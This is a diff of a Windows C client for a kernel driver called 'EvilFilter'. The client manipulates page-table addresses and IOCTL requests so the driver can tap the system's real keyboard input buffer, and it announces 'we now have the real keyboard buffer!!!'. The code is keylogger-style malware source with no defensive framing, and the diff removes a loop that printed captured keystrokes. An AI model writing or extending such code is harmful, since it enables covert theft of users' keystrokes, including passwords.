@@ -5,6 +5,38 @@
 #include <windows.h>
 #include <SharedHeader.h>
 
+#include <ntsecapi.h>
+
+
+VOID pauseForABit(WORD secondsDelay) {
+
+	printf("Waiting for %d seconds...", secondsDelay);
+	SYSTEMTIME systemTime;
+	GetSystemTime(&systemTime);
+	WORD ExitMinute = systemTime.wMinute;
+	WORD ExitSecond = systemTime.wSecond + secondsDelay;
+	while (ExitSecond > 59) {
+		ExitSecond = ExitSecond - 60;
+		ExitMinute = ExitMinute + 1;
+	}
+	while (ExitMinute > 59) {
+		ExitMinute = ExitMinute - 60;
+	}
+	WORD CurrentMinute = systemTime.wMinute;
+	WORD CurrentSecond = systemTime.wSecond;
+
+
+	while (TRUE) {
+		GetSystemTime(&systemTime);
+		CurrentMinute = systemTime.wMinute;
+		CurrentSecond = systemTime.wSecond;
+		if (CurrentMinute == ExitMinute && CurrentSecond >= ExitSecond) {
+			break;
+		}
+	}
+	printf("done waiting\n");
+	return;
+}
 VOID WaitAMinute() {
 	printf("Waiting a minute...");
 	SYSTEMTIME systemTime;
@@ -40,28 +72,6 @@ int main(int argc, _TCHAR* argv[]) {
 
 	if (INVALID_HANDLE_VALUE == hControlDevice) {
 		printf("Failed to open EvilFilter device\n");
-
-		PBYTE r = (PBYTE)VirtualAlloc(NULL, sizeof(PBYTE), MEM_COMMIT | MEM_RESERVE, PAGE_READONLY); // PAGE_READONLY);
-		*r = 15;
-		printf("R is [0x%lx][0x%d]\n", r, *r);
-		PULONG x = (PULONG)&r[0];
-		printf("X0 is [0x%lx][0x%lu]\n", x, *x);
-		x = (PULONG)&r[1];
-		printf("X1 is [0x%lx][0x%lu]\n", x, *x);
-		x = (PULONG)&r[2];
-		printf("X2 is [0x%lx][0x%lu]\n", x, *x);
-		x = (PULONG)&r[3];
-		printf("X3 is [0x%lx][0x%lu]\n", x, *x);
-		x = (PULONG)&r[4];
-		printf("X4 is [0x%lx][0x%lu]\n", x, *x);
-		x = (PULONG)&r[5];
-		printf("X5 is [0x%lx][0x%lu]\n", x, *x);
-		x = (PULONG)&r[6];
-		printf("X6 is [0x%lx][0x%lu]\n", x, *x);
-		x = (PULONG)&r[10];
-		printf("X10 is [0x%lx][0x%lu]\n", x, *x);
-		*x = 15;
-		printf("X10 is [0x%lx][0x%lu]\n", x, *x);
 	}
 	else {
 
@@ -89,27 +99,25 @@ int main(int argc, _TCHAR* argv[]) {
 		}
 		else {
 			ULONG kmdfOffset = dataToTransmit->offset;
+
+			printf("Ioctl to EvilFilter device succeeded...KMDF offset is [0x%lx]\n", kmdfOffset);
 			ULONG keyboardOffset = (ULONG)keyboardData & 0x0fff;
-			printf("Ioctl to EvilFilter device succeeded...offsets are [0x%lx] [0x%lx]\n", kmdfOffset, keyboardOffset);
-
-
-			//keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
-
-
-			//keyboardData = (PKEYBOARD_INPUT_DATA)&rawAddress[kmdfOffset];
-
-
-			keyboardOffset = (ULONG)keyboardData & 0x0fff;
-
-			printf("keyboardData is [0x%lx] offset is [0x%lx].\n", keyboardData, keyboardOffset);
-			/**/
+			if (dataToTransmit->largePage) {
+				keyboardOffset = (ULONG)keyboardData & 0x1fffff;
+			}
+			printf("keyboardData is [0x%lx] offset is [0x%lx].\n Trying to get pointer with 'correct' offset [0x%lx]\n", keyboardData, keyboardOffset, kmdfOffset);
 			PLLIST listNode;
 			listNode = (PLLIST)malloc(sizeof(LLIST));
 			listNode->keyboardBuffer = keyboardData;
 			listNode->previous = NULL;
 			while (keyboardOffset != kmdfOffset) {
 				keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
-				keyboardOffset = (ULONG)keyboardData & 0x0fff;
+				if (dataToTransmit->largePage) {
+					keyboardOffset = (ULONG)keyboardData & 0x1fffff;
+				}
+				else {
+					keyboardOffset = (ULONG)keyboardData & 0xfff;
+				}
 				PLLIST previousListNode = listNode;
 				listNode = (PLLIST)malloc(sizeof(LLIST));
 				listNode->keyboardBuffer = keyboardData;
@@ -125,21 +133,13 @@ int main(int argc, _TCHAR* argv[]) {
 				}
 				free(currentListNode);
 			}
-			PVOID ppde = GetPdeAddress(keyboardData);
-			PVOID ppte = GetPteAddress(keyboardData);
-			/**/
-
-			//PVOID ppde = GetPdeAddress(rawAddress);
-			//PVOID ppte = GetPteAddress(rawAddress);
-			printf("Page Directory is [0x%lx] Page Table is [0x%lx]\n", ppde, ppte);
-			//PKEYBOARD_INPUT_DATA rawAddress = (PKEYBOARD_INPUT_DATA)VirtualAlloc(keyboardData, sizeof(KEYBOARD_INPUT_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READONLY);
-
+			printf("Page Directory is [0x%lx] Page Table is [0x%lx]\nAbout to transmit request to driver\n", GetPteAddress(keyboardData), GetPdeAddress(keyboardData));
 			dataToTransmit->ClientMemory = keyboardData;
-			//dataToTransmit->ClientMemory = rawAddress;
-			dataToTransmit->PageDirectory = ppde;
-			dataToTransmit->PageTable = ppte;
 			dataToTransmit->instruction = 'E';
 
+			pauseForABit(10);
+			printf("\nTransmitting\n");
+			pauseForABit(5);
 			if (!DeviceIoControl(hControlDevice,
 				IOCTL_CUSTOM_CODE,
 				NULL, 0,
@@ -149,58 +149,27 @@ int main(int argc, _TCHAR* argv[]) {
 			}
 			else {
 				printf("Ioctl to EvilFilter device succeeded \n");
-				//keyboardData = (PKEYBOARD_INPUT_DATA)&rawAddress[kmdfOffset];
-				printf("keyboardData=[0x%lx]\n", keyboardData);
 				printf(" we now have the real keyboard buffer!!!\n");
-				//printf("keyboardData=[0x%lx]\n", *keyboardData);
-				USHORT lastFlag = 0;
+				dataToTransmit->instruction = 'Q';
 
-
-				SYSTEMTIME systemTime;
-				GetSystemTime(&systemTime);
-				WORD CurrentMinute = systemTime.wMinute;
-				WORD ExitMinute = systemTime.wMinute + 3;
-				while (CurrentMinute != ExitMinute) {
-					/*
-					
-	USHORT UnitId;
-	USHORT MakeCode;
-	USHORT Flags;
-	USHORT Reserved;
-	ULONG ExtraInformation;
-					*/
-					if (lastFlag != keyboardData->Flags ) { // keyboardData->MakeCode != 0
-						printf(" %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx]",
-							keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
-							keyboardData->MakeCode,
-							KeyMap[keyboardData->MakeCode],
-							keyboardData->UnitId,
-							keyboardData->Flags,
-							keyboardData->Reserved,
-							keyboardData->ExtraInformation);
-						printf(" raw:");
-						PCHAR p = (PCHAR)keyboardData;
-						for (int i = 0; i < 12; i++) {
-							printf("[0x%x]", p[i]);
-
-						}
-						printf("\n");
-
-
-
-
-						lastFlag = keyboardData->Flags;
-					}
-					GetSystemTime(&systemTime);
-					CurrentMinute = systemTime.wMinute;
+				printf("\nDouble checking with the driver that the address is correct\n");
+				pauseForABit(5);
+				if (!DeviceIoControl(hControlDevice,
+					IOCTL_CUSTOM_CODE,
+					NULL, 0,
+					dataToTransmit, SharedMemoryLength,
+					&bytes, &DeviceIoOverlapped)) {
+					printf("Ioctl to EvilFilter device failed - unable to query driver\n");
+				}
+				else {
+					printf("\nverified....examine KMDF log\n");
 				}
 			}
 		}
 		CloseHandle(hControlDevice);
-		WaitAMinute();
+		pauseForABit(10);
 		printf("almost done\n");
-		WaitAMinute();
-		// Everything dies right here, right as we exit
+		pauseForABit(3000);
 	}
 	printf("fin\n");
 	return 0;
